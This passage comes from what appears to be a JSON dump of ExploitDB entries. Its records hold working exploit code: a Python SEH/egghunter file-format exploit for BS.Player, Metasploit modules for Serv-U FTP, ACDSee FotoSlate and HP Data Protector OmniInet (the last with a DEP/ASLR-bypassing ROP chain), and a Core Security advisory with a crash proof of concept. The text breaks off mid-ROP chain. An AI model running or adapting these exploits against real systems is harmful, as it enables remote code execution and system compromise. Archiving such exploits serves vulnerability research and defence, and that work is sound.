\"YTP3KXWLE3O9XCKXJA\")\r\n\r\nprint \"[*]The Length Shellcode:\"+str(len(shellcode))\r\n\r\ntime.sleep(1)\r\n\r\nshellcode += \"\\x41\" * 5000\r\n\r\nfile = str(sys.argv[2])\r\n\r\npayload = buffer+nseh+seh+egg_hunter+junk+shellcode\r\n\r\nop = \"w\"\r\nprint \"[*]Creating Your File \"+file\r\ntime.sleep(1)\r\ntry:\r\n        f = open(file,op)\r\n        f.write(\"http://\"+payload)\r\n        f.close()\r\n        print \"[*]The File \"+file+\" was Successfully Created\"\r\nexcept:\r\n        print \"[*]Error Creating File \"+file",
                "description": "BS.Player 2.57 - Local Buffer Overflow (SEH Unicode)",
                "author": "C4SS!0 G0M3S",
                "_id": 15934,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-01-07T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = NormalRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Egghunter\r\n\tinclude Msf::Exploit::Remote::Ftp\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'Serv-U FTP Server <4.2 Buffer Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tThis module exploits a stack buffer overflow in the site chmod command\r\n\t\t\t\tin versions of Serv-U FTP Server prior to 4.2.\r\n\r\n\t\t\t\tYou must have valid credentials to trigger this vulnerability. Exploitation\r\n\t\t\t\talso leaves the service in a non-functional state.\r\n\t\t\t},\r\n\t\t\t'Author'         => 'thelightcosine <thelightcosine[at]metasploit.com>',\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision$',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2004-2111'],\r\n\t\t\t\t\t[ 'BID', '9483'],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => true,\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'thread',\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'    => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",\r\n\t\t\t\t\t'DisableNops' => true,\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'Windows 2000 SP0-4 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x750212bc, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 396 } ],\r\n\t\t\t\t\t[ 'Windows XP SP0-1 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x71aa388f, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 394 } ]\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' => 'Dec 31 2004',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\tend\r\n\r\n\tdef check\r\n\t\tconnect\r\n\t\tdisconnect\r\n\r\n\t\tif (banner =~ /Serv-U FTP Server v((4.(0|1))|3.\\d)/)\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\t\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\r\n\tdef exploit\r\n\t\tconnect_login\r\n\r\n\t\teggoptions =\r\n\t\t{\r\n\t\t\t:checksum => true,\r\n\t\t\t:eggtag => \"W00T\"\r\n\t\t}\r\n\r\n\t\thunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)\r\n\r\n\r\n\t\tbuffer = \"chmod 777 \"\r\n\t\tbuffer <<  make_nops(target['Offset'] - egg.length - hunter.length)\r\n\t\tbuffer << egg\r\n\t\tbuffer << hunter\r\n\t\tbuffer << \"\\xeb\\xc9\\x41\\x41\"\t#nseh, jump back to egghunter\r\n\t\tbuffer << [target.ret].pack('V')\t#seh\r\n\t\tbuffer << rand_text(5000)\r\n\r\n\t\tprint_status(\"Trying target #{target.name}...\")\r\n\r\n\t\tsend_cmd( ['SITE', buffer] , false)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\n\r\nend",
                "description": "RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18190,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-02T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\n  Core Security Technologies - Corelabs Advisory\r\n       http://corelabs.coresecurity.com/\r\n\r\n  HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\n\r\n\r\n1. *Advisory Information*\r\n\r\nTitle: HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\nAdvisory ID: CORE-2011-0606\r\nAdvisory URL:\r\nhttp://www.coresecurity.com/content/HP-Data-Protector-EXECCMD-Vulnerability\r\nDate published: 2011-06-29\r\nDate of last update: 2011-06-29\r\nVendors contacted: HP\r\nRelease mode: Coordinated release\r\n\r\n\r\n2. *Vulnerability Information*\r\n\r\nClass: Remote stack overflow [CWE-120]\r\nImpact: Code execution\r\nRemotely Exploitable: Yes\r\nLocally Exploitable: No\r\nCVE Name: CVE-2011-1866\r\n\r\n\r\n3. *Vulnerability Description*\r\n\r\nHP Data Protector [1] is an automated backup and recovery software for\r\nsingle-server to enterprise environments. A vulnerability in HP Data\r\nProtector could allow a remote attacker to execute arbitrary code. The\r\nvulnerability is triggered by sending a request to port 5555 of a host\r\nrunning the \"data protector inet\" service, part of HP Data Protector.\r\n\r\n\r\n4. *Vulnerable packages*\r\n\r\n   . HP OpenView Storage Data Protector v6.20 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.11 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.10 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.00 (running on Windows).\r\n   . Previous versions may be affected, but were not tested.\r\n\r\n\r\n5. *Non-vulnerable packages*\r\n\r\n   . No fixes are available at the time of publication.\r\n\r\n\r\n6. *Vendor Information, Solutions and Workarounds*\r\n\r\nHP has issued a security bulletin with document ID c02872182 [2]\r\navailable through HP Support Center at http://www.hp.com/go/HPSC.\r\n\r\nThe latest version of HP Data Protector is vulnerable to this issue. HP\r\nhas provided the following procedure to mitigate this vulnerability:\r\n\r\n   1. Upgrade to Data Protector A.06.20 or subsequent.\r\n   2. Enable encrypted control communication services on cell server and\r\nall clients in cell.\r\n\r\n The upgrade is available for download from\r\nhttp://hp.com/go/dataprotector then under 'Product Information' click on\r\n'Trials and Demos'.\r\n\r\n\r\n7. *Credits*\r\n\r\nThis vulnerability was discovered and researched by Nahuel C. Riva from\r\nCore Security Technologies. Publication was coordinated by Carlos Sarraute.\r\n\r\n\r\n8. *Technical Description / Proof of Concept Code*\r\n\r\nThe following python script can be used to reproduce the bug.\r\n\r\n/-----\r\nimport sys\r\nimport socket\r\n\r\nfrom struct import pack\r\n\r\nip = sys.argv[1]\r\nport = int(sys.argv[2]) # default tcp port 5555\r\n\r\ntarget = (ip, port)\r\n\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(target)\r\n\r\npath = 'A' * 5000\r\n\r\npacket =  pack('<L', 0x20003220)\r\npacket += pack('<L', 0x00302000)\r\npacket += '\\x20'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('<L', 0x00432000)\r\npacket += pack('<L', 0x00303220)\r\npacket += '\\x20'\r\npacket += 'omnicheck.exe'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('>H', 0x0020) * 4\r\npacket += pack('<L', 0x30200030)\r\npacket += pack('>H', 0x0020)\r\npacket += path\r\npacket += pack('>H', 0x0000)\r\n\r\nplen = pack('>L', len(packet))\r\n\r\ns.send(plen + packet)\r\n\r\n- -----/\r\n By executing this script, the omniinet.exe process crashes in the\r\nfollowing EIP:\r\n\r\n/-----\r\n7C8285D3    8B0424           MOV EAX,DWORD PTR SS:[ESP]\r\n7C8285D6    8BE5             MOV ESP,EBP\r\n7C8285D8    5D               POP EBP\r\n7C8285D9    C3               RETN\r\n        \r\n- -----/\r\n This is part of a function inside the ntdll.dll library, however, if we\r\nlook the SEH chain, we can see that the SEH handler was overwritten with\r\nthe value 0x00410041 (the unicode value for \"AA\"):\r\n\r\n/-----\r\nSEH chain of thread 00000578\r\nAddress    SE handler\r\n009AFF94   omniinet.00410041\r\n00410041   A3004472\r\n        \r\n- -----/\r\n The following are the values of the CPU registers at the time of the\r\ncrash:\r\n\r\n/-----\r\nEAX C0000008\r\nECX 009AEC98\r\nEDX 7C82859C ntdll.KiRaiseUserExceptionDispatcher\r\nEBX 0015B480\r\nESP 009AEC44\r\nEBP 009AEC94\r\nESI 00155A80\r\nEDI 00000000\r\nEIP 7C8285D3 ntdll.7C8285D3\r\nC 0  ES 0023 32bit 0(FFFFFFFF)\r\nP 1  CS 001B 32bit 0(FFFFFFFF)\r\nA 0  SS 0023 32bit 0(FFFFFFFF)\r\nZ 0  DS 0023 32bit 0(FFFFFFFF)\r\nS 0  FS 003B 32bit 7FFDB000(FFF)\r\nT 0  GS 0000 NULL\r\nD 0\r\nO 0  LastErr ERROR_SUCCESS (00000000)\r\nEFL 00000206 (NO,NB,NE,A,NS,PE,GE,G)\r\nST0 empty 0.0\r\nST1 empty 0.0\r\nST2 empty 0.0\r\nST3 empty 0.0\r\nST4 empty 0.0\r\nST5 empty 0.0\r\nST6 empty 0.7610000000000000098\r\nST7 empty 1.0000000000000000000\r\n               3 2 1 0      E S P U O Z D I\r\nFST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)\r\nFCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1\r\n        \r\n- -----/\r\n The problem is in the 0041D170 function. This function does a blind\r\ncopy of the string passed in the packet as a path:\r\n\r\n/-----\r\n0041D170     /$ 55             PUSH EBP\r\n0041D171     |. 8BEC           MOV EBP,ESP\r\n0041D173     |. 51             PUSH ECX\r\n0041D174     |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D177     |. 8945 FC        MOV DWORD PTR SS:[EBP-4],EAX\r\n0041D17A     |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]\r\n0041D17D     |. 0FB711         MOVZX EDX,WORD PTR DS:[ECX]\r\n0041D180     |. 85D2           TEST EDX,EDX\r\n0041D182     |. 74 73          JE SHORT omniinet.0041D1F7\r\n[...]\r\n0041D1F7     |> 8B45 0C        /MOV EAX,DWORD PTR SS:[EBP+C]\r\n0041D1FA     |. 0FB708         |MOVZX ECX,WORD PTR DS:[EAX]\r\n0041D1FD     |. 85C9           |TEST ECX,ECX\r\n0041D1FF     |. 74 26          |JE SHORT omniinet.0041D227\r\n0041D201     |. 8B55 08        |MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D204     |. 8955 FC        |MOV DWORD PTR SS:[EBP-4],EDX\r\n0041D207     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D20A     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D20D     |. 66:8B11        |MOV DX,WORD PTR DS:[ECX]\r\n0041D210     |. 66:8910        |MOV WORD PTR DS:[EAX],DX // copy WORDs\r\nto the stack\r\n0041D213     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D216     |. 83C0 02        |ADD EAX,2\r\n0041D219     |. 8945 08        |MOV DWORD PTR SS:[EBP+8],EAX\r\n0041D21C     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D21F     |. 83C1 02        |ADD ECX,2\r\n0041D222     |. 894D 0C        |MOV DWORD PTR SS:[EBP+C],ECX\r\n0041D225     |.^EB D0          \\JMP SHORT omniinet.0041D1F7\r\n0041D227     |> 8B55 08        MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D22A     |. 66:C702 0000   MOV WORD PTR DS:[EDX],0\r\n0041D22F     |. 8B45 FC        MOV EAX,DWORD PTR SS:[EBP-4]\r\n0041D232     |. 8BE5           MOV ESP,EBP\r\n0041D234     |. 5D             POP EBP\r\n0041D235     \\. C3             RETN\r\n        \r\n- -----/\r\n\r\n\r\n\r\n9. *Report Timeline*\r\n\r\n. 2011-06-06:\r\nCore Security Technologies notifies the HP team of the vulnerabilities\r\nand provides the technical details. Publication date is temporarily set\r\nto July 5th, 2011.\r\n\r\n. 2011-06-06:\r\nVendor confirms that a new case was assigned within HP Software Security\r\nResponse Team (SSRT).\r\n\r\n. 2011-06-16:\r\nCore requests an update on this issue, in particular Core asks the\r\nvendor for a technical analysis of the bugs, a list of affected products\r\nand versions, and the vendor's plan for providing a fix (no reply\r\nreceived).\r\n\r\n. 2011-06-23:\r\nCore requests once more an update.\r\n\r\n. 2011-06-28:\r\nVendor communicates that a security bulletin will be issued on the same\r\nday (June 28). The vendor confirms the vulnerabilities, and recommends\r\nas mitigation to enable encrypted communications in the cell server and\r\nclient.\r\n\r\n. 2011-06-28:\r\nCore requests a link to the vendor's bulletin, and asks whether CVE ids\r\nhave been assigned.\r\n\r\n. 2011-06-28:\r\nVendor provides a link to the bulletin and CVE names for the\r\nvulnerabilities.\r\n\r\n. 2011-06-29:\r\nAdvisory CORE-2011-0606 is published.\r\n\r\n\r\n\r\n10. *References*\r\n\r\n[1] HP Data Protector http://hp.com/go/dataprotector\r\n[2] HPSBMU02686 SSRT100541 rev.2 - HP OpenView Storage Data Protector,\r\nRemote Execution of Arbitrary Code\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182\r\n\r\n\r\n11. *About CoreLabs*\r\n\r\nCoreLabs, the research center of Core Security Technologies, is charged\r\nwith anticipating the future needs and requirements for information\r\nsecurity technologies. We conduct our research in several important\r\nareas of computer security including system vulnerabilities, cyber\r\nattack planning and simulation, source code auditing, and cryptography.\r\nOur results include problem formalization, identification of\r\nvulnerabilities, novel solutions and prototypes for new technologies.\r\nCoreLabs regularly publishes security advisories, technical papers,\r\nproject information and shared software tools for public use at:\r\nhttp://corelabs.coresecurity.com.\r\n\r\n\r\n12. *About Core Security Technologies*\r\n\r\nCore Security Technologies enables organizations to get ahead of threats\r\nwith security test and measurement solutions that continuously identify\r\nand demonstrate real-world exposures to their most critical assets. Our\r\ncustomers can gain real visibility into their security standing, real\r\nvalidation of their security controls, and real metrics to more\r\neffectively secure their organizations.\r\n\r\nCore Security's software solutions build on over a decade of trusted\r\nresearch and leading-edge threat expertise from the company's Security\r\nConsulting Services, CoreLabs and Engineering groups. Core Security\r\nTechnologies can be reached at +1 (617) 399-6980 or on the Web at:\r\nhttp://www.coresecurity.com.\r\n\r\n\r\n13. *Disclaimer*\r\n\r\nThe contents of this advisory are copyright (c) 2011 Core Security\r\nTechnologies and (c) 2011 CoreLabs, and are licensed under a Creative\r\nCommons Attribution Non-Commercial Share-Alike 3.0 (United States)\r\nLicense: http://creativecommons.org/licenses/by-nc-sa/3.0/us/\r\n\r\n\r\n14. *PGP/GPG Keys*\r\n\r\nThis advisory has been signed with the GPG key of Core Security\r\nTechnologies advisories team, which is available for download at\r\nhttp://www.coresecurity.com/files/attachments/core_security_advisories.asc.\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.9 (MingW32)\r\n\r\niEYEARECAAYFAk4LnZsACgkQyNibggitWa07/ACfSlzkBvbowAskeP/K4FqtxCay\r\nEAkAnRCPKdc35t5Cb0ZJbGy4me4JRALo\r\n=zHon\r\n-----END PGP SIGNATURE-----",
                "description": "HP Data Protector 6.20 - EXEC_CMD Buffer Overflow",
                "author": "Core Security",
                "_id": 17461,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-06-30T00:00:00+00:00",
                "cve": [
                    "CVE-2011-1866"
                ],
                "type": "dos",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: acdsee_fotoslate_string.rb 13853 2011-10-10 16:47:33Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::FILEFORMAT\r\n\tinclude Msf::Exploit::Remote::Seh\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'ACDSee FotoSlate PLP File id Parameter Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via\r\n\t\t\t\ta specially crafted id parameter in a String element.  When viewing a malicious\r\n\t\t\t\tPLP file with the ACDSee FotoSlate product, a remote attacker could overflow a\r\n\t\t\t\tbuffer and execute arbitrary code. This exploit has been tested on systems such as\r\n\t\t\t\tWindows XP SP3, Windows Vista, and Windows 7.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Parvez Anwar', # Vulnerability discovery\r\n\t\t\t\t\t'juan vazquez'  # Metasploit module\r\n\t\t\t\t],\r\n\t\t\t'Version'        => '$Revision: 13853 $',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-2595' ],\r\n\t\t\t\t\t[ 'OSVDB', '75425' ],\r\n\t\t\t\t\t[ 'BID', '49558' ],\r\n\t\t\t\t],\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'process',\r\n\t\t\t\t\t'DisablePayloadHandler' => 'true'\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t#'Space'    => 4000,\r\n\t\t\t\t\t'BadChars' => \"\\x00\\x22\"\r\n\t\t\t\t},\r\n\t\t\t'Platform' => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'ACDSee FotoSlate 4.0 Build 146',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'         => 0x263a5b57, # pop, pop, ret from ipwssl6.dll\r\n\t\t\t\t\t\t\t'Offset'      => 1812,\r\n\t\t\t\t\t\t\t'TotalLength' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => 'Sep 12 2011',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOptString.new('FILENAME', [ true, 'The file name.',  'msf.plp']),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\toverflow = rand_text(target[\"Offset\"])\r\n\t\toverflow << generate_seh_record(target.ret)\r\n\t\toverflow << payload.encoded\r\n\t\toverflow << rand_text_alpha(target[\"TotalLength\"] - overflow.length)\r\n\r\n\t\tplp =<<TEMPLATE\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<ACDFotoSlateDocument15>\r\n<PageDefinition>\r\n<Template>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Properties>\r\n<String id=\"#{overflow}\"></String>\r\n<String id=\"Width\">8.500000IN</String>\r\n<String id=\"Height\">11.000000IN</String>\r\n<String id=\"Orientation\">Portrait</String>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Bool id=\"AutoFill\">FALSE</Bool>\r\n</Properties>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Properties>\r\n<String id=\"XPos\">0.500000IN</String>\r\n<String id=\"YPos\">0.500000IN</String>\r\n<String id=\"Width\">7.500000IN</String>\r\n<String id=\"Height\">10.000000IN</String>\r\n<Float id=\"Tilt\">0.000000</Float>\r\n</Properties>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</Template>\r\n<PageContent>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</PageContent>\r\n</PageDefinition>\r\n</ACDFotoSlateDocument15>\r\nTEMPLATE\r\n\r\n\t\tprint_status(\"Creating '#{datastore['FILENAME']}' file ...\")\r\n\t\tfile_create(plp)\r\n\tend\r\n\r\nend\r\n\r\n\r\n=begin\r\nAfter SEH, we have ~0x23C3 bytes (9155 in decimal) of space for payload. But we need to avoid\r\nusing a long buffer in order to avoid the meterpreter possibly being broken.\r\n=end",
                "description": "ACDSee FotoSlate - '.PLP' File 'id' Local Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17966,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-10-10T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: hp_omniinet_4.rb 13096 2011-07-04 22:33:47Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"HP OmniInet.exe Opcode 20 Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability found in HP Data Protector's OmniInet\r\n\t\t\t\tprocess.  By supplying a long string of data as the file path with opcode '20',\r\n\t\t\t\ta buffer overflow can occur when this data is being written on the stack where\r\n\t\t\t\tno proper bounds checking is done beforehand, which results arbitrary code\r\n\t\t\t\texecution under the context of SYSTEM.  This module is also made against systems\r\n\t\t\t\tsuch as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR\r\n\t\t\t\tenabled by default.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => \"$Revision: 13096 $\",\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Oren Isacson',  #Initial discovery, poc\r\n\t\t\t\t\t'muts',          #Initial poc of the ROP exploit w/ dookie\r\n\t\t\t\t\t'dookie',        #Initial poc of the ROP exploit w/ muts\r\n\t\t\t\t\t'sinn3r',        #MSF module with corelanc0d3r  (Also Thx to MC and HD)\r\n\t\t\t\t\t'corelanc0d3r',  #MSF module with sinn3r\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-1865' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.exploit-db.com/exploits/17468/' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],\r\n\t\t\t\t\t[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182' ],\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'        => \"\\x00\",\r\n\t\t\t\t\t'PrependEncoder'  => \"\\x66\\x81\\xc4\\xb8\\x0b\\x61\\x9d\", #add sp, 0xb88; popad; popfd\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => \"process\",\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t#If 'Max' gets too long (ie. 10000 bytes), we can get a busted heap\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on XP SP3 or Win Server 2003',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 2005,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on Win Server 2008',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 1993,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Jun 29 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options([Opt::RPORT(5555)], self.class)\r\n\tend\r\n\r\n\tdef nop\r\n\t\treturn make_nops(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\tconnect\r\n\r\n\t\t#mona.py tekniq\r\n\t\t#https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/\r\n\t\trop = [\r\n\t\t\t#Initial setup\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t#ROP begins here\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # Make EAX readable\r\n\t\t\t0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EBP\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # <- VirtualProtect() found in IAT\r\n\t\t\t0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0b,  # Slide, so next gadget would write to correct stack location\r\n\t\t\t0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EDI (filler)\r\n\t\t\tnop,         # will be patched at runtime (VP), then picked up into ESI\r\n\t\t\tnop,         # EBX (filler)\r\n\t\t\t0x7c376402,  # POP EBP # RETN (msvcr71.dll)\r\n\t\t\t0x7c345c30,  # ptr to push esp #  ret  (from MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0xfffff82f,  # size 20001 